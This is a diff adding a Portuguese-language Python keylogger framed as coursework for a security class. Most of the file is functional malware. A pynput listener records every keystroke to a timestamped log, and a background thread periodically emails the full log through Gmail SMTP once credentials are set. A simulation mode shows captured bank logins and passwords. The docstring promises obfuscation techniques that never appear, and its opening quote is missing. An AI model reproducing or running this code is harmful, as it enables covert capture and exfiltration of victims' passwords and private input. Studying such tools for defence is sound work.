@@ -1,0 +1,334 @@
+========================================================
+  KEYLOGGER SIMULADO - FINS EDUCACIONAIS APENAS
+  Disciplina: Segurança da Informação / DIO
+  Autor: Elias
+    NÃO USAR EM SISTEMAS REAIS OU SEM AUTORIZAÇÃO
+========================================================
+ 
+Este script demonstra como um keylogger funciona:
+1. Captura teclas pressionadas em tempo real
+2. Registra em arquivo .txt com timestamps
+3. Simula envio por e-mail (modo seguro/demonstração)
+4. Demonstra técnicas de ofuscação comuns
+ 
+Bibliotecas necessárias:
+    pip install pynput
+ 
+Para o envio de e-mail real (opcional):
+    Configure as variáveis EMAIL_REMETENTE e EMAIL_DESTINATARIO
+    e use uma senha de app do Gmail (não a senha real da conta)
+"""
+ 
+import os
+import smtplib
+import threading
+import time
+from datetime import datetime
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from pathlib import Path
+ 
+try:
+    from pynput import keyboard
+    PYNPUT_DISPONIVEL = True
+except ImportError:
+    PYNPUT_DISPONIVEL = False
+    print(" pynput não instalado. Executando em modo de simulação.")
+    print(" Instale com: pip install pynput\n")
+ 
+ 
+# ─── Configurações ─────────────────────────────────────────────────────────────
+ARQUIVO_LOG = "keylog_educacional.txt"
+INTERVALO_ENVIO_SEGUNDOS = 60      # A cada quantos segundos "enviar" o log
+MAX_TECLAS_BUFFER = 100            # Enviar após N teclas acumuladas
+MODO_SIMULACAO = not PYNPUT_DISPONIVEL  # True = simula captura sem pynput
+ 
+# Configurações de e-mail (preencha apenas em ambiente de testes)
+EMAIL_REMETENTE = "seu_email@gmail.com"
+EMAIL_DESTINATARIO = "destino@gmail.com"
+EMAIL_SENHA_APP = ""  # Senha de App do Gmail (não a senha real!)
+SMTP_HOST = "smtp.gmail.com"
+SMTP_PORT = 587
+ 
+ 
+# ─── Classe Principal do Keylogger ─────────────────────────────────────────────
+class KeyloggerEducacional:
+    """
+    Implementação educacional de um keylogger.
+    
+    Técnicas demonstradas:
+    - Interceptação de eventos de teclado (pynput)
+    - Buffering de teclas para reduzir I/O
+    - Timestamps para contextualizar as capturas
+    - Thread separada para envio periódico
+    - Detecção de teclas especiais (Enter, Backspace, etc.)
+    """
+ 
+    def __init__(self):
+        self.buffer_teclas = []
+        self.total_capturado = 0
+        self.ativo = False
+        self.lock = threading.Lock()
+        self.thread_envio = None
+ 
+        # Garante que o arquivo de log existe
+        Path(ARQUIVO_LOG).touch()
+ 
+        self._log_cabecalho()
+ 
+    def _log_cabecalho(self):
+        """Registra informações de sessão no início do log."""
+        with open(ARQUIVO_LOG, "a", encoding="utf-8") as f:
+            f.write("\n" + "=" * 60 + "\n")
+            f.write(f"  SESSÃO INICIADA: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
+            f.write(f"  MODO: {'Simulação' if MODO_SIMULACAO else 'Captura Real'}\n")
+            f.write("  APENAS PARA FINS EDUCACIONAIS\n")
+            f.write("=" * 60 + "\n\n")
+ 
+    def _formatar_tecla(self, tecla) -> str:
+        """Converte o objeto de tecla em texto legível."""
+        try:
+            # Tecla comum (letra, número, símbolo)
+            return tecla.char if tecla.char else ""
+        except AttributeError:
+            # Tecla especial
+            mapa_especiais = {
+                "Key.space": " ",
+                "Key.enter": "\n[ENTER]\n",
+                "Key.backspace": "[⌫]",
+                "Key.tab": "[TAB]",
+                "Key.caps_lock": "[CAPS]",
+                "Key.shift": "",
+                "Key.shift_r": "",
+                "Key.ctrl_l": "[CTRL]",
+                "Key.ctrl_r": "[CTRL]",
+                "Key.alt_l": "[ALT]",
+                "Key.alt_r": "[ALT]",
+                "Key.delete": "[DEL]",
+                "Key.esc": "[ESC]",
+            }
+            return mapa_especiais.get(str(tecla), f"[{str(tecla).replace('Key.', '').upper()}]")
+ 
+    def ao_pressionar_tecla(self, tecla):
+        """Callback chamado a cada tecla pressionada."""
+        with self.lock:
+            texto = self._formatar_tecla(tecla)
+            if texto:
+                self.buffer_teclas.append(texto)
+                self.total_capturado += 1
+ 
+                # Adiciona timestamp a cada 10 teclas
+                if self.total_capturado % 10 == 0:
+                    ts = datetime.now().strftime("%H:%M:%S")
+                    self.buffer_teclas.append(f" [{ts}] ")
+ 
+                # Descarrega buffer ao atingir limite
+                if len(self.buffer_teclas) >= MAX_TECLAS_BUFFER:
+                    self._salvar_buffer()
+ 
+        # Para ao pressionar F12 (tecla de saída do laboratório)
+        if str(tecla) == "Key.f12":
+            print("\n[F12] Keylogger encerrado pelo usuário.")
+            self.parar()
+            return False  # Retornar False para o pynput para o listener
+ 
+    def _salvar_buffer(self):
+        """Persiste as teclas do buffer no arquivo de log."""
+        if not self.buffer_teclas:
+            return
+ 
+        conteudo = "".join(self.buffer_teclas)
+        with open(ARQUIVO_LOG, "a", encoding="utf-8") as f:
+            f.write(conteudo)
+ 
+        self.buffer_teclas.clear()
+ 
+    def _thread_envio_periodico(self):
+        """
+        Thread que simula o envio periódico do log por e-mail.
+        Em malwares reais, este dado seria exfiltrado sem o conhecimento da vítima.
+        """
+        while self.ativo:
+            time.sleep(INTERVALO_ENVIO_SEGUNDOS)
+            if self.ativo:
+                self._salvar_buffer()
+                self._enviar_log_email()
+ 
+    def _enviar_log_email(self):
+        """
+        Envia o log por e-mail.
+        
+        IMPORTANTE: Em um ataque real, isto é feito silenciosamente.
+        Aqui, imprimimos o que aconteceria para fins didáticos.
+        """
+        conteudo_log = Path(ARQUIVO_LOG).read_text(encoding="utf-8")
+ 
+        # Modo demonstração: apenas imprime o que seria enviado
+        if not EMAIL_SENHA_APP or EMAIL_REMETENTE == "seu_email@gmail.com":
+            print(f"\n📧 [SIMULAÇÃO] E-mail seria enviado:")
+            print(f"   De: {EMAIL_REMETENTE}")
+            print(f"   Para: {EMAIL_DESTINATARIO}")
+            print(f"   Assunto: Keylog - {datetime.now().strftime('%d/%m/%Y %H:%M')}")
+            print(f"   Tamanho do log: {len(conteudo_log)} caracteres")
+            print(f"   Total capturado: {self.total_capturado} teclas")
+            return
+ 
+        # Modo real: envia e-mail (somente se credenciais configuradas)
+        try:
+            msg = MIMEMultipart()
+            msg["From"] = EMAIL_REMETENTE
+            msg["To"] = EMAIL_DESTINATARIO
+            msg["Subject"] = f"[LAB] Keylog - {datetime.now().strftime('%d/%m/%Y %H:%M')}"
+ 
+            corpo = (
+                f"Total de teclas capturadas: {self.total_capturado}\n\n"
+                f"Conteúdo do log:\n"
+                f"{'─' * 40}\n"
+                f"{conteudo_log}"
+            )
+            msg.attach(MIMEText(corpo, "plain", "utf-8"))
+ 
+            with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
+                server.starttls()
+                server.login(EMAIL_REMETENTE, EMAIL_SENHA_APP)
+                server.send_message(msg)
+ 
+            print(f" Log enviado por e-mail ({self.total_capturado} teclas)")
+ 
+        except Exception as e:
+            print(f" Falha no envio de e-mail: {e}")
+ 
+    def iniciar(self):
+        """Inicia a captura de teclas."""
+        self.ativo = True
+ 
+        # Inicia thread de envio periódico
+        self.thread_envio = threading.Thread(
+            target=self._thread_envio_periodico,
+            daemon=True
+        )
+        self.thread_envio.start()
+ 
+        print("\n" + "═" * 60)
+        print("  KEYLOGGER EDUCACIONAL - CAPTURA INICIADA")
+        print("═" * 60)
+        print(f"  Log salvo em: {ARQUIVO_LOG}")
+        print(f"  Envio simulado a cada: {INTERVALO_ENVIO_SEGUNDOS}s")
+        print(f"  Pressione F12 para encerrar")
+        print("═" * 60 + "\n")
+ 
+        if MODO_SIMULACAO:
+            self._modo_simulacao()
+        else:
+            # Inicia listener de teclado
+            with keyboard.Listener(on_press=self.ao_pressionar_tecla) as listener:
+                listener.join()
+ 
+        self.parar()
+ 
+    def _modo_simulacao(self):
+        """Simula captura de teclas sem pynput (para ambientes sem suporte)."""
+        print("MODO SIMULAÇÃO: Demonstrando o que seria capturado\n")
+ 
+        teclas_simuladas = [
+            ("Usuário digita URL do banco", "www.bancodobrasil.com.br[ENTER]"),
+            ("Usuário digita login", "joao.silva@email.com[TAB]"),
+            ("Usuário digita senha", "MinhaS3nha!2024[ENTER]"),
+            ("Usuário faz pesquisa", "comprar carro popular[ENTER]"),
+        ]
+ 
+        for descricao, teclas in teclas_simuladas:
+            print(f"   {descricao}")
+            print(f"    Capturado: {teclas}\n")
+            time.sleep(1)
+ 
+            with open(ARQUIVO_LOG, "a", encoding="utf-8") as f:
+                ts = datetime.now().strftime("%H:%M:%S")
+                f.write(f"[{ts}] {teclas}\n")
+ 
+        print("\n  Observe como dados sensíveis (senhas, URLs) são capturados!")
+        print(f"📄 Verifique o arquivo: {ARQUIVO_LOG}")
+        self._enviar_log_email()
+ 
+    def parar(self):
+        """Encerra o keylogger e salva o buffer restante."""
+        self.ativo = False
+        with self.lock:
+            self._salvar_buffer()
+ 
+        with open(ARQUIVO_LOG, "a", encoding="utf-8") as f:
+            f.write(f"\n[SESSÃO ENCERRADA: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}]\n")
+ 
+        print(f"\n Sessão encerrada. Total capturado: {self.total_capturado} teclas")
+        print(f"📄 Log completo em: {ARQUIVO_LOG}")
+ 
+ 
+# ─── Função auxiliar de análise do log ────────────────────────────────────────
+def analisar_log():
+    """Analisa o arquivo de log e exibe estatísticas."""
+    if not Path(ARQUIVO_LOG).exists():
+        print(" Arquivo de log não encontrado.")
+        return
+ 
+    conteudo = Path(ARQUIVO_LOG).read_text(encoding="utf-8")
+    linhas = conteudo.split("\n")
+ 
+    print("\n" + "═" * 60)
+    print("   ANÁLISE DO LOG")
+    print("═" * 60)
+    print(f"  Tamanho do arquivo: {Path(ARQUIVO_LOG).stat().st_size} bytes")
+    print(f"  Total de linhas: {len(linhas)}")
+    print(f"  Total de caracteres: {len(conteudo)}")
+ 
+    # Contagem de teclas especiais
+    especiais = {
+        "Enters": conteudo.count("[ENTER]"),
+        "Backspaces": conteudo.count("[⌫]"),
+        "Tabs": conteudo.count("[TAB]"),
+    }
+    print("\n  Teclas especiais detectadas:")
+    for nome, qtd in especiais.items():
+        print(f"    {nome}: {qtd}")
+ 
+    print("\n  Primeiras 300 chars do log:")
+    print("  " + conteudo[:300].replace("\n", "\n  "))
+    print("═" * 60)
+ 
+ 
+# ─── Menu interativo ───────────────────────────────────────────────────────────
+def menu():
+    print("\n" + "═" * 60)
+    print("   LABORATÓRIO DE KEYLOGGER (Fins Educacionais)")
+    print("═" * 60)
+    print("  1. Iniciar captura de teclas")
+    print("  2. Analisar log existente")
+    print("  3. Limpar arquivo de log")
+    print("  0. Sair")
+    print("═" * 60)
+ 
+    while True:
+        opcao = input("\nEscolha uma opção: ").strip()
+ 
+        if opcao == "1":
+            kg = KeyloggerEducacional()
+            kg.iniciar()
+ 
+        elif opcao == "2":
+            analisar_log()
+ 
+        elif opcao == "3":
+            if Path(ARQUIVO_LOG).exists():
+                Path(ARQUIVO_LOG).unlink()
+                print(f" Arquivo '{ARQUIVO_LOG}' removido.")
+            else:
+                print("Arquivo de log não encontrado.")
+ 
+        elif opcao == "0":
+            print("\n Use este conhecimento para PROTEGER sistemas, não para atacar!")
+            break
+        else:
+            print("Opção inválida.")
+ 
+ 
+if __name__ == "__main__":
+    menu()
